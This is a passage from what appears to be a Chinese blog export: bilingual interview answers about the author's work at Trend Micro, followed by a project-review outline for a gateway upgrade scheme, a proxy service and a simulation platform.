<p>And I think working at Trend Micro improved my skills in multiple areas.<br>这种工作模式锻炼了我多方面的技能</p>
<h2><span id="what-were-the-best-aspects-of-your-last-job-对于目前仍在职的工作你最喜欢地方有哪些">What were the best aspects of your last job (对于目前仍在职的工作，你最喜欢地方有哪些)</span></h2><p>I like my current job because I can learn a lot of things.<br>我喜欢这份工作的地方, 可以学到很多新的东西</p>
<p>Besides coding and testing, I can also engage with customer requirements, participate in design work and handle customer’s cases.<br>除了编码和测试, 我还能接触客户需求, 参与系统设计, 处理客户问题 </p>
<p>I think working at Trend Micro improved my skills in multiple areas.<br>在趋势的工作锻炼了我多方面的技能</p>
<p>And I don’t have too much overtime, it’s easy for me to achieve a good work-life balance at Trend Micro.<br>很少加班，容易实现工作和生活的平衡 </p>
<h2><span id="describe-the-employee-you-most-enjoy-working-with-你喜欢和什么样的员工共事">Describe the employee you most enjoy working with (你喜欢和什么样的员工共事)</span></h2><p>I enjoy working with straightforward people. It’s comfortable to communicate with them. And good communication is vert important at work.<br>我喜欢和直爽的同事合作, 和这些同事沟通起来很顺畅。良好的沟通是工作顺利完成的保证</p>
<p>I also like working with positive-minded people. I don’t like working with people who always complain. I think complaining is just a waste of time.<br>我喜欢和阳光的同事合作, 不喜欢和在工作中经常抱怨的同事交流, 因为抱怨解决不了问题</p>
<h2><span id="what-is-an-ideal-boss-like-你理想的老板什么样的">What is an ideal boss like (你理想的老板什么样的)</span></h2><p>Ideal boss? Let me see, I appreciate a boss who trusts their employees, and is willing to give them important projects to handle.<br>我喜欢信任员工的老板，愿意把重要的项目交给员工去做</p>
<p>Also, an ideal boss can motivate his team members by encouring good performance and punishing poor performance.<br>另外，我喜欢赏罚分明的老板, 做的好的有奖励, 不足的时候给出批评</p>
<p>I will feel highly motivated to do a good job if I know my boss would reward me for excellent performance.<br>激发员工的积极性</p>
<h2><span id="would-you-briefly-describe-your-company-to-me-请你简单介绍下前公司">Would you briefly describe your company to me (请你简单介绍下前公司)</span></h2><p>OK, Trend Micro was founded in 1988 in the US. Our company is a global leader in cybersecurity solutions.<br>趋势科技1988年在美国硅谷成立, 是全球网络安全解决方案的领导者</p>
<p>And we provide antivirus software, firewall, cloud security and other services.<br>给客户提供防病毒软件、防火墙、云安全等服务</p>
<p>Our unified cybersecurity platform protects hunderds of thousand organizations and hunderds of million individuals.<br>公司在全球有超过50万家企业客户和上亿的终端客户</p>
<p>With 7000 employees across 60 countries, Trend Mirco is focused on security and passionate about making the world a safer and better place.<br>在全球60多个国家设有分公司，员工超过7000人。 趋势科技专注于安全领域，愿景是打造一个交换数字信息零风险的世界</p>
<h2><span id="would-you-describe-your-typical-working-day-描述你一天的日常工作">Would you describe your typical working day (描述你一天的日常工作)</span></h2><p>Yes. A typical working day for me starts at 9 AM.<br>可以, 我的日常工作在每天9点左右开始。</p>
<p>Firstly, I will handle customer’s cases. I need to communicate with technical supports or our customers, and provide them effective solutions as quickly as possible.<br>首先是处理客户的case, 需要和TS或者客户交流，快速定位问题，提供解决方案。</p>
<p>Next, I work on feature development and maintenance of our Service Gateway project. This includes designing, coding, testing and so on.<br>然后是项目的特性开发和维护，包括需求设计, 编码, 测试, 发布工作。</p>
<p>I work closely with my team every day to ensure that the work is completed correctly.<br>日常工作中需要和团队成员合作，确保工作正确完成</p>
<h1><span id="关于团队合作的问题">关于团队合作的问题</span></h1><h2><span id="could-you-please-provide-an-overview-of-your-rampd-team-介绍你的研发团队情况"><strong>Could you please provide an overview of your R&amp;D team (介绍你的研发团队情况)</strong></span></h2><p>Our team consists of 10 members.<br>我们团队约有10名成员组成</p>
<p>We have one Project Manager who is responsible for project planning, requirement identification, and progress management.<br>1名项目经理, 负责整体项目规划, 识别需求, 进度管理</p>
<p>We have one Senior Stuff Engineer who provides technical guidance to the whole team, and helps make key technical decisions.<br>1名资深工程师, 为整个团队提供技术指导, 参与关键技术决策</p>
<p>And three Senior Engineers are responsible for feature development of the Service Gateway project.<br>I focus on Virtual appliance, one handles frontend and another handles backend.<br>3名高级工程师负责服务网关项目开发, 其中我本人负责虚拟设备开发，1位同事负责前端，1个同事负责后端</p>
<p>There are two QA and OPS are responsible for testing and CI&#x2F;CD.<br>2名QA和OPS, 负责测试, 版本发布, CI&#x2F;CD</p>
<p>The remaining members develop other features.<br>其余成员负责别的项目特性开发</p>
<h2><span id="how-do-you-collaborate-with-your-team-你在项目中怎么合作的"><strong>How do you collaborate with your team (你在项目中怎么合作的)</strong></span></h2><p>In the service gateway project, I am responsible for feature development of virtual appliance. Here are some examples of how I collaborate with my team.<br>我在项目中负责虚拟设备的特性开发, 这个过程中涉及到很多合作, 比如:</p>
<p>I work closely with a Senior Staff Engineer to discuss design.<br>和团队资深开发讨论设计方案</p>
<p>I work with my backend colleague to design communication schemes between virtual appliance and the backend. such as message format and REST API.<br>和后端同事讨论虚拟设备和云端的通信方案, 比如消息格式, REST API</p>
<p>When a new feature is implemented or a bug is fixed,  I provide detailed explanations to QA. This helps improve their testing efficiency.<br>和QA合作, 每次实现一个新功能或修复BUG时, 向QA详细说明修改内容和测试方法, 从而提高测试效率</p>
<p>I also work with TS when handling customer cases and provide solution to customers.<br>和TS合作,处理客户案例时, 积极和TS沟通客户的问题, 提供解决方案</p>
<h2><span id="how-did-you-react-to-disagreements-between-you-and-your-boss-与老板意见不一致你怎么办"><strong>How did you react to disagreements between you and your boss (与老板意见不一致，你怎么办)</strong></span></h2><p>First of all, I would respect my boss. Try to understand the problem from his perspective.<br>首先我会尊重老板的观点，尝试从老板的角度看问题。 因为老板拥有更丰富的经验</p>
<p>I would express my opinion to him by persenting data or doing proof-of-concept to support my ideas.<br>我会通过展示数据，做原型验证的方式, 向老板表达我的看法.</p>
<p>If disagreements still exist, I would seek out senior colleagues or experts to explore the most appropriate solution together.<br>如果仍然存在分歧, 我会寻求资深同事意见, 讨论一个最合适的解决方案</p>
<p>Finally, I will support my team’s decision even if my suggestion is not adopted.<br>即使最后没有采用我的方案，我也会全力支持团队和领导的决定</p>
<h2><span id="how-did-you-react-to-disagreements-between-you-and-your-colleague-与同事意见不一致你怎么办"><strong>How did you react to disagreements between you and your colleague (与同事意见不一致，你怎么办)</strong></span></h2><p>First of all, I would listen to my colleague and try to understand his perspective.<br>当我和同事意见不同时，我会先倾听同事的观点, 去理解同事的思路</p>
<p>I would work together with my colleague and discuss the pros and cons of each solution.<br>我会和同事一起分析并讨论各自方案的优缺点</p>
<p>If disagreements still exist, I would seek out senior colleagues or experts to explore the most appropriate solution together.<br>如果双方仍然存在分歧, 我会建议寻求资深同事意见, 共同讨论一下最合适的方案</p>
<p>Finally, I will support my team’s decision even if my suggestion is not adopted.<br>即使最后没有采用我的方案，我也会全力支持团队的决定</p>
<h1><span id="关于自我评价的问题">关于自我评价的问题</span></h1><h2><span id="what-are-your-strengths-as-an-employee-作为一名公司员工-你觉得自己有什么优点"><strong>What are your strengths as an employee (作为一名公司员工, 你觉得自己有什么优点)</strong></span></h2><p>I think my strength is the ability to learn quickly. For example, when I first took over the project, I wasn’t familar with Kubernetes.<br>But I learned it very quickly and contributed to the project in a very short time.<br>快速学习能力. 比如我刚接手项目时, 不了解K8S; 但我在很短时间内, 通过自学快速上手项目.</p>
<p>Another strength is proactive thinking and optimization. For example, in the Service Gateway project,<br>I optimized the upgrade solution for virtual appliance, which grealy improved user experience and development efficiency.<br>我的另一个优点是, 主动思考和优化项目的能力, 比如在服务网关项目中, 我优化了虚拟设备的升级方案, 从而提高了开发效率, 改善了用户体验. </p>
<p>Thirdly, I’m good at trouble-shooting. In the FPS project, I solved many network connectivity issues by packet capture.<br>This also enhanced my unstanding of the HTTP protocol.<br>还有问题定位的能力. 比如FPS项目中定位了一些客户网络不通的问题, 通过抓包分析, 加深了对HTTP协议的理解</p>
<h2><span id="what-are-your-strengths-as-an-employee-作为一名公司员工-你觉得自己有什么缺点"><strong>What are your strengths as an employee (作为一名公司员工, 你觉得自己有什么缺点)</strong></span></h2><p>[TODO]<br>在过去的工作中, 存在过于扣技术细节，忽略了从用户角度出发思考问题.</p>
<p>比如华为的Matrix仿真项目，我建议使用k8s管理容器, 被架构师反对. 他们指出项目的核心需求是, 让用户在自己开发机上快速地搭建环境<br>而k8s的复杂性和资源消耗, 并不符合用户真正需求. 这让我意识到，技术选型需要从用户出发, 不是单纯追求新技术</p>
<p>比如趋势的服务网关项目, 开发微服务的时候需要提供REST API. 我最初想用熟悉的Java实现,<br>被同事指出Java过于重量级, 让我尝试Python, 最后快速实现了需求, 同时降低了维护成本</p>
<p>这些经验让我认识到, 技术选型需要以解决问题为核心，考虑用户体验、 开发效率、 维护成本，而不是盲目依赖已知技术或追逐新技术</p>
<h1><span id="请你提问">请你提问</span></h1><p>员工</p>
<h2><span id="能分享一下您平时的工作内容吗-在工作中会用到哪些技术栈">能分享一下您平时的工作内容吗? 在工作中会用到哪些技术栈</span></h2><h2><span id="部门的主要人员分配以及对应的工作能简单介绍一下吗">部门的主要人员分配以及对应的工作能简单介绍一下吗？</span></h2><h2><span id="能不能问一下你当时因为什么原因选择加入这家公司的呢或者说这家公司有哪些地方吸引你">能不能问一下，你当时因为什么原因选择加入这家公司的呢或者说这家公司有哪些地方吸引你？</span></h2><h2><span id="想问下目前团队正在处理哪些重点项目这些项目中遇到的主要挑战是什么">想问下目前团队正在处理哪些重点项目？这些项目中遇到的主要挑战是什么</span></h2><p>What are the team’s important projects, and what challenges are involved ?</p>
<h2><span id="您觉得做技术开发应该在具体的某一个领域钻的更深呢还是应该更广泛的涉及不同领域的技术知识-很多时候这两者是矛盾的">您觉得做技术开发，应该在具体的某一个领域钻的更深呢，还是应该更广泛的涉及不同领域的技术知识？ 很多时候这两者是矛盾的</span></h2><p>领导</p>
<h2><span id="以您来看这个岗位未来在公司内部的发展如何-在我看来问这个问题也是对你自己的负责吧谁不想发展前景更好的岗位呢">以您来看，这个岗位未来在公司内部的发展如何？ (在我看来，问这个问题也是对你自己的负责吧，谁不想发展前景更好的岗位呢？)</span></h2><h2><span id="与同行业的竞争者相比贵公司的核心竞争优势在什么地方">与同行业的竞争者相比，贵公司的核心竞争优势在什么地方？</span></h2><h2><span id="公司现在面临的最大挑战是什么">公司现在面临的最大挑战是什么</span></h2><h2><span id="贵公司的发展目标和方向是什么">贵公司的发展目标和方向是什么？</span></h2><h2><span id="您觉得在这个职位表现出色的员工有哪些特点">您觉得在这个职位表现出色的员工有哪些特点</span></h2><p>What qualities do you think make employees stand out in this position ?</p>
<p>HR</p>
<h2><span id="可以说明一下贵公司的晋升机制或发展路径吗">可以说明一下贵公司的晋升机制或发展路径吗</span></h2><p>Could you tell me the promotion or career development path at your company ?</p>
<h2><span id="我想知道贵公司是如何进行绩效考核的">我想知道贵公司是如何进行绩效考核的</span></h2><p>How does your company evaluate employee’s performance ?</p>
<h2><span id="您觉得贵公司最看重员工的哪些品质">您觉得贵公司最看重员工的哪些品质</span></h2><p>What qualities does your company value most in its employees?</p>
<h1><span id="其他问题">其他问题</span></h1><h2><span id="如果没有被录用你咋办">如果没有被录用，你咋办?</span></h2><p>I will accept the reality, keep learning to improve my skills, and try harder next time.<br>我会接受现实, 做面试复盘, 不断学习, 完善技能, 再接再厉</p>
<h1><span id="参考资料">参考资料</span></h1><p>[1] <a href="https://cloud.tencent.com/developer/article/1970192">https://cloud.tencent.com/developer/article/1970192</a><br>[2] <a href="https://yongluo2013.github.io/questions-for-english-interview/">https://yongluo2013.github.io/questions-for-english-interview/</a></p>
]]></content>
      <categories>
        <category>interview</category>
      </categories>
      <tags>
        <tag>interview</tag>
      </tags>
  </entry>
  <entry>
    <title>项目问题梳理</title>
    <url>/2020/0102175630.html</url>
    <content><![CDATA[<!-- toc -->

<ul>
<li><a href="#%E9%A1%B9%E7%9B%AE-trend-micro-service-gateway">项目: Trend Micro - Service Gateway</a><ul>
<li><a href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E9%A1%B9%E7%9B%AE">简单介绍项目</a></li>
<li><a href="#1%E4%B8%BAon-premises%E7%BD%91%E5%85%B3%E8%AE%BE%E5%A4%87%E8%AE%BE%E8%AE%A1%E4%BA%86%E5%9F%BA%E4%BA%8Elinux%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%88%86%E5%8C%BA%E7%9A%84%E5%8D%87%E7%BA%A7%E6%96%B9%E6%A1%88-%E6%B6%89%E5%8F%8A%E5%8D%87%E7%BA%A7%E5%8C%85%E6%9E%84%E5%BB%BA-%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%90%8C%E6%AD%A5-grub%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%AE%BE%E7%BD%AE%E7%AD%89%E7%8E%AF%E8%8A%82-%E6%AD%A4%E6%96%B9%E6%A1%88%E8%A7%A3%E5%86%B3%E4%BA%86%E7%B3%BB%E7%BB%9F%E6%95%85%E9%9A%9C%E5%90%8E%E6%97%A0%E6%B3%95%E5%9B%9E%E6%BB%9A%E7%9A%84%E9%97%AE%E9%A2%98-%E5%B9%B6%E5%88%A0%E9%99%A4%E4%BA%861gb%E7%9A%84%E5%A2%9E%E9%87%8F%E5%8D%87%E7%BA%A7%E4%BB%A3%E7%A0%81-%E9%99%8D%E4%BD%8E%E4%BA%8690%E7%BB%B4%E6%8A%A4%E6%88%90%E6%9C%AC">1.为On-premises网关设备设计了基于Linux双系统分区的升级方案, 涉及升级包构建, 网络配置同步, GRUB启动项设置等环节. 此方案解决了系统故障后无法回滚的问题, 并删除了1GB的增量升级代码, 降低了90%维护成本</a></li>
<li><a href="#2-%E9%80%9A%E8%BF%87%E5%AE%9A%E5%88%B6initramfs%E8%BF%9B%E5%85%A5%E7%B4%A7%E6%80%A5%E6%A8%A1%E5%BC%8F-%E9%A2%84%E5%85%88%E5%B0%86%E5%8D%87%E7%BA%A7%E5%8C%85%E5%A4%87%E4%BB%BD%E5%88%B0%E5%86%85%E5%AD%98%E5%90%8E%E5%86%8D%E9%87%8D%E5%BB%BA%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA-%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%BB%8E%E5%8D%95%E7%B3%BB%E7%BB%9F%E5%88%86%E5%8C%BA%E5%88%B0%E5%8F%8C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%97%A0%E7%BC%9D%E8%BF%81%E7%A7%BB-%E5%A4%A7%E5%B9%85%E6%8F%90%E5%8D%87%E4%BA%86%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C">2. 通过定制initramfs进入紧急模式, 预先将升级包备份到内存后再重建磁盘分区, 实现了从单系统分区到双系统的无缝迁移, 大幅提升了用户体验</a></li>
<li><a href="#3-%E5%BC%80%E5%8F%91%E4%BA%86%E4%B8%80%E4%B8%AA%E8%BF%90%E8%A1%8C%E5%9C%A8%E7%BD%91%E5%85%B3%E8%AE%BE%E5%A4%87%E4%B8%8A%E7%9A%84%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9D%97-%E5%88%A9%E7%94%A8aws-iot%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E5%9C%A8%E7%BA%BF%E5%8D%87%E7%BA%A7%E7%AD%89%E5%8A%9F%E8%83%BD-%E5%B9%B6%E9%80%9A%E8%BF%87%E5%BF%83%E8%B7%B3%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E8%A7%A3%E5%86%B3%E5%BE%AE%E6%9C%8D%E5%8A%A1%E5%90%8C%E6%AD%A5%E7%9A%84%E9%97%AE%E9%A2%98-%E5%BC%95%E5%85%A5%E9%A2%84%E4%B8%8B%E8%BD%BD%E6%9C%BA%E5%88%B6%E6%8F%90%E9%AB%98%E5%8D%87%E7%BA%A7%E7%9A%84%E7%A8%B3%E5%AE%9A%E6%80%A7">3. 开发了一个运行在网关设备上的控制模块, 利用AWS IoT消息队列实现在线升级等功能, 并通过心跳检测方法解决微服务同步的问题; 引入预下载机制提高升级的稳定性</a></li>
<li><a href="#4%E4%BC%98%E5%8C%96%E4%BA%86%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%9B%86%E6%88%90%E6%96%B9%E6%A1%88-%E5%B0%86%E5%BE%AE%E6%9C%8D%E5%8A%A1%E4%BB%8E%E8%99%9A%E6%8B%9F%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E4%B8%AD%E8%A7%A3%E8%80%A6-%E5%B9%B6%E4%BD%BF%E7%94%A8microk8s-ingress%E6%8F%90%E4%BE%9B%E7%BB%9F%E4%B8%80%E7%9A%84%E8%AE%BF%E9%97%AE%E5%85%A5%E5%8F%A3-%E5%B0%86%E8%99%9A%E6%8B%9F%E8%AE%BE%E5%A4%87%E9%95%9C%E5%83%8F%E4%BB%8E45g%E5%8E%8B%E7%BC%A9%E8%87%B327g-%E5%AE%A2%E6%88%B7%E5%AE%89%E8%A3%85%E6%97%B6%E9%97%B4%E7%BC%A9%E7%9F%AD%E4%BA%8640">4.优化了微服务的集成方案, 将微服务从虚拟设备固件中解耦, 并使用Microk8s Ingress提供统一的访问入口, 将虚拟设备镜像从4.5G压缩至2.7G, 客户安装时间缩短了40%</a></li>
<li><a href="#5-%E6%80%8E%E4%B9%88%E4%BD%BF%E7%94%A8%E8%AF%8A%E6%96%AD%E5%91%BD%E4%BB%A4%E5%AE%9A%E4%BD%8D%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98">5. 怎么使用诊断命令定位网络问题</a></li>
<li><a href="#%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E5%8C%96%E7%9A%84">项目中还有什么优化的</a></li>
<li><a href="#%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%9B%A2%E9%98%9F%E6%88%90%E5%91%98%E7%BB%84%E6%88%90">项目中团队成员组成</a></li>
<li><a href="#%E4%BD%A0%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E9%83%A8%E5%88%86-%E5%93%AA%E4%BA%9B%E6%98%AF%E5%90%88%E4%BD%9C%E7%9A%84-%E5%A6%82%E4%BD%95%E5%90%88%E4%BD%9C">你做了哪些部分, 哪些是合作的, 如何合作</a></li>
</ul>
</li>
<li><a href="#%E9%A1%B9%E7%9B%AE2-forward-proxy-service">项目2: Forward Proxy Service</a><ul>
<li><a href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E9%A1%B9%E7%9B%AE-1">简单介绍项目</a></li>
<li><a href="#%E5%9F%BA%E4%BA%8Esquid%E6%90%AD%E5%BB%BA%E4%BA%86%E6%94%AF%E6%8C%81basic%E8%AE%A4%E8%AF%81%E5%92%8C%E7%99%BD%E5%90%8D%E5%8D%95%E9%85%8D%E7%BD%AE%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1-%E9%80%9A%E8%BF%87acl%E8%A7%84%E5%88%99%E6%8B%A6%E6%88%AA%E9%9D%9E%E6%B3%95%E8%AF%B7%E6%B1%82-%E5%A2%9E%E5%BC%BA%E4%BA%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7">基于Squid搭建了支持Basic认证和白名单配置的正向代理服务, 通过ACL规则拦截非法请求, 增强了系统的安全性</a><ul>
<li><a href="#%E5%88%86%E6%9E%90%E5%B9%B6%E8%BF%85%E9%80%9F%E8%A7%A3%E5%86%B3%E5%AE%A2%E6%88%B7%E7%BD%91%E7%BB%9C%E4%B8%8D%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98-%E6%B6%89%E5%8F%8Ahttp%E9%9A%A7%E9%81%93%E5%92%8Ctls%E6%8F%A1%E6%89%8B%E5%8E%9F%E7%90%86">分析并迅速解决客户网络不通的问题, 涉及HTTP隧道和TLS握手原理</a></li>
<li><a href="#%E8%AE%BE%E8%AE%A1%E4%BA%86%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Estunnel%E7%9A%84%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E6%96%B9%E6%A1%88-%E6%98%BE%E8%91%97%E5%87%8F%E5%B0%91%E4%BA%86%E5%9B%A0%E5%AE%A2%E6%88%B7%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%BC%82%E5%B8%B8%E5%AF%BC%E8%87%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98-%E6%9E%81%E5%A4%A7%E6%8F%90%E5%8D%87%E4%BA%86%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C">设计了一个基于Stunnel的加密通信方案, 显著减少了因客户防火墙配置异常导致的网络问题, 极大提升了用户体验</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E9%A1%B9%E7%9B%AE3-matrix%E4%BB%BF%E7%9C%9F%E5%B9%B3%E5%8F%B0">项目3: Matrix仿真平台</a><ul>
<li><a href="#%E9%80%9A%E8%BF%87redis%E9%94%AE%E7%A9%BA%E9%97%B4%E9%80%9A%E7%9F%A5%E6%9C%BA%E5%88%B6-%E6%A8%A1%E6%8B%9F%E4%BA%86%E5%8D%95%E6%9D%BF%E6%8F%92%E6%8B%94%E7%9A%84%E4%BB%BF%E7%9C%9F-%E5%B9%B6%E9%80%9A%E8%BF%87%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BD%91%E6%A1%A5%E6%A8%A1%E6%8B%9F%E6%A1%86%E5%BC%8F%E5%BD%A2%E6%80%81%E7%9A%84%E4%BB%BF%E7%9C%9F-%E6%89%A9%E5%B1%95%E4%BA%86%E4%BB%BF%E7%9C%9F%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%B5%8B%E8%AF%95%E8%8C%83%E5%9B%B4">通过Redis键空间通知机制, 模拟了单板插拔的仿真, 并通过自定义网桥模拟框式形态的仿真, 扩展了仿真平台的测试范围</a></li>
<li><a href="#%E5%B0%86redis%E9%A9%B1%E5%8A%A8%E6%8E%A5%E5%8F%A3%E4%BB%8E%E7%9F%AD%E8%BF%9E%E6%8E%A5%E4%BC%98%E5%8C%96%E4%B8%BA%E9%95%BF%E8%BF%9E%E6%8E%A5-%E6%8E%A5%E5%8F%A3%E5%B9%B3%E5%9D%87%E8%AF%BB%E5%86%99%E6%97%B6%E9%97%B4%E4%BB%8E2ms%E7%BC%A9%E7%9F%AD%E4%B8%BA01ms-%E6%98%BE%E8%91%97%E6%8F%90%E5%8D%87%E4%BA%86%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87">将Redis驱动接口从短连接优化为长连接, 接口平均读写时间从2ms缩短为0.1ms, 显著提升了测试效率</a></li>
<li><a href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98">其他问题</a></li>
</ul>
</li>
<li><a href="#%E6%8A%80%E8%83%BD%E6%8F%8F%E8%BF%B0">技能描述</a><ul>
<li><a href="#docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%E5%8F%8A%E5%AE%B9%E5%99%A8%E9%97%B4%E9%80%9A%E4%BF%A1%E7%9A%84%E5%8E%9F%E7%90%86">Docker网络模式及容器间通信的原理</a></li>
<li><a href="#nginx-ingress">Nginx Ingress</a></li>
<li><a href="#coredns%E5%8E%9F%E7%90%86">CoreDNS原理</a></li>
<li><a href="#calico%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F">Calico网络模式</a></li>
</ul>
</li>
<li><a href="#%E5%85%B6%E4%BB%96%E9%A1%B9%E7%9B%AE%E9%97%AE%E9%A2%98">其他项目问题</a><ul>
<li><a href="#%E8%AF%B4%E4%B8%8Blinux%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B">说下Linux启动流程</a></li>
<li><a href="#grub%E4%BB%80%E4%B9%88%E5%8E%9F%E7%90%86">GRUB什么原理</a></li>
<li><a href="#initramfs%E6%98%AF%E4%BB%80%E4%B9%88">initramfs是什么</a></li>
<li><a href="#%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%B8%8D%E4%B8%A2%E5%A4%B1">怎么保证消息不丢失</a></li>
<li><a href="#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%B6%88%E6%81%AF%E9%87%8D%E5%A4%8D%E6%B6%88%E8%B4%B9">如何避免消息重复消费</a></li>
<li><a href="#%E5%A6%82%E6%9E%9C%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC%E6%9C%89%E9%97%AE%E9%A2%98-%E6%80%8E%E4%B9%88%E6%9C%80%E5%B0%8F%E5%8C%96%E7%94%A8%E6%88%B7%E5%BD%B1%E5%93%8D">如果升级版本有问题, 怎么最小化用户影响</a></li>
<li><a href="#jwt%E6%B3%A8%E5%86%8C%E6%B5%81%E7%A8%8B">JWT注册流程</a></li>
<li><a href="#jwt%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88">JWT工作原理是什么</a></li>
<li><a href="#jwt%E5%92%8Csession">JWT和Session</a></li>
<li><a href="#cookie%E5%92%8Csession%E8%AE%A4%E8%AF%81%E9%97%AE%E9%A2%98">Cookie和Session认证问题</a></li>
</ul>
</li>
<li><a href="#%E7%AE%80%E5%8E%86%E4%B8%AD%E7%9A%84%E6%8A%80%E6%9C%AF%E5%90%8D%E8%AF%8D">简历中的技术名词</a><ul>
<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%87%87%E7%94%A8%E6%B7%B7%E5%90%88%E4%BA%91%E6%9E%B6%E6%9E%84">为什么采用混合云架构?</a></li>
<li><a href="#microk8s%E9%9B%86%E7%BE%A4%E6%98%AF%E6%8C%87%E4%BB%80%E4%B9%88-%E4%BD%A0%E4%BB%AC%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%94%A8%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4">Microk8s集群是指什么? 你们为什么不用高可用集群?</a></li>
<li><a href="#%E5%A6%82%E6%9E%9C%E6%98%AF%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4-%E4%BD%A0%E5%87%86%E5%A4%87%E6%80%8E%E4%B9%88%E9%83%A8%E7%BD%B2">如果是高可用集群, 你准备怎么部署?</a></li>
<li><a href="#xdr%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D">XDR是什么意思</a></li>
<li><a href="#localactiveupdate">LocalActiveUpdate</a></li>
<li><a href="#webreputation">WebReputation</a></li>
<li><a href="#fps%E4%B8%AD-%E9%80%90%E4%B8%80%E4%B8%BA%E7%AB%AF%E7%82%B9%E9%85%8D%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5%E7%97%9B%E7%82%B9%E6%8C%87%E7%9A%84%E6%98%AF%E4%BB%80%E4%B9%88">FPS中, 逐一为端点配置防火墙策略痛点指的是什么</a></li>
<li><a href="#air-gap%E6%98%AF%E5%95%A5%E6%84%8F%E6%80%9D">Air Gap是啥意思</a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%91%E8%AE%A1%E7%AE%97">什么是云计算</a></li>
<li><a href="#%E5%85%AC%E6%9C%89%E4%BA%91%E5%92%8C%E7%A7%81%E6%9C%89%E4%BA%91">公有云和私有云</a></li>
<li><a href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%8D%B3%E6%9C%8D%E5%8A%A1iaas-%E5%B9%B3%E5%8F%B0%E5%8D%B3%E6%9C%8D%E5%8A%A1paas-%E8%BD%AF%E4%BB%B6%E5%8D%B3%E6%9C%8D%E5%8A%A1saas">基础设施即服务(IaaS), 平台即服务(PaaS),  软件即服务(SaaS)</a></li>
</ul>
</li>
<li><a href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E8%B4%B9%E7%94%A8">云服务费用</a></li>
</ul>
<!-- tocstop -->

<span id="more"></span>

<h1><span id="项目-trend-micro-service-gateway">项目: Trend Micro - Service Gateway</span></h1><h2><span id="简单介绍项目">简单介绍项目</span></h2><p>Service Gateway是一款部署在企业网络中的服务网关, 采用混合云架构, 降低客户的带宽消耗和云服务费用.<br>该服务网关由一个云端管理平台和一组基于Rocky Linux的虚拟网关设备组成, 支持VMware, Hyper-V, AWS多平台部署<br>网关设备通过Microk8s集群方式运行在客户本地环境, 提供多种XDR(扩展检测与响应)服务, 服务于5万家企业客户, 覆盖1亿台终端设备  </p>
<h2><span id="1为on-premises网关设备设计了基于linux双系统分区的升级方案-涉及升级包构建-网络配置同步-grub启动项设置等环节-此方案解决了系统故障后无法回滚的问题-并删除了1gb的增量升级代码-降低了90维护成本">1.为On-premises网关设备设计了基于Linux双系统分区的升级方案, 涉及升级包构建, 网络配置同步, GRUB启动项设置等环节. 此方案解决了系统故障后无法回滚的问题, 并删除了1GB的增量升级代码, 降低了90%维护成本</span></h2><p><strong>主要难点是什么, 如何解决的</strong><br>在早期，客户的On-premises网关设备使用增量升级方案进行固件更新, 这个方案存在一些严重的问题, 比如:<br>升级到新版本后出现故障，无法回滚到之前的版本, 客户只能重装系统，用户体验差。<br>为了保证所有客户都能升级到最新版本, 升级包必须保存从初始版本到最新版本的所有增量文件;<br>我接手项目时升级包已经达到1G, 随着版本迭代，升级包变得越来越大，难以维护。</p>
<p>为了解决这些问题, 我设计了一个基于双系统分区的全量升级方案, 难点包括升级包构建, 升级前后配置怎么同步, GRUB启动项怎么配置.</p>
